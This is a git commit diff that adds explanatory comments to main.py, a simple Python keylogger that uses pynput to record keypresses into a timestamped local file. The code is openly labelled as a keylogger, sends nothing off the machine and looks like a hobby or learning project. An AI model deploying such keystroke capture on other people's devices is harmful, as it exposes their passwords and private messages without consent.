660a22aafec4b2d34215338402bcee56aa8e2bad
Balaj-dev <mbalajmubeen@gmail.com>
2025-11-21 16:36:47 +0500

    Adding comments.

--- main.py
+++ main.py
@@ -1,17 +1,19 @@
+#imported modules
 from pynput import keyboard
 from datetime import datetime
 
-
+#getting current date and time
 now = datetime.now()
 now = (now.strftime("%Y-%m-%d %H:%M"))
 
+#creating and opening file
 with open("logger_result.txt" , "a") as file:
     file.write(f"key loger file at {now} is named {now}_Keylogger_data \n")
 
 with open(f"{now}_Keylogger_data" , "w") as file:
     file.write(" ")
 
-
+#function triggers when a key is pressed
 def pressed(key):
     try:
         key_pressed = format(key.char)
@@ -27,10 +29,13 @@ def pressed(key):
             if key_pressed == "Key.space":
                 file.write(" ")
 
+#assigning main function (pressed) to a pre-defined variable
 with keyboard.Listener(
     on_press=pressed) as listner:
     listner.join()
-
 listener = keyboard.Listener(
     on_press=pressed)
+
+
+#starting the program by calling the main function
 listener.start()
